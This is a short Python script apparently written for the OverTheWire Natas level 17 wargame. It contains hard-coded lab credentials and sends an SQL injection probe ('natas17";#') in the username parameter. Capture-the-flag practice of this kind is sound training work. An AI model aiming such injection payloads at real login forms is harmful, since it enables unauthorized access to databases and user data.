import requests
from requests.auth import HTTPBasicAuth  
authorization=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')  


url = 'http://natas17.natas.labs.overthewire.org/index.php'
parameters = {'debug':'True', 'username':'natas17";#'}

result = requests.get(url, params=parameters, auth=authorization)

print(result.text)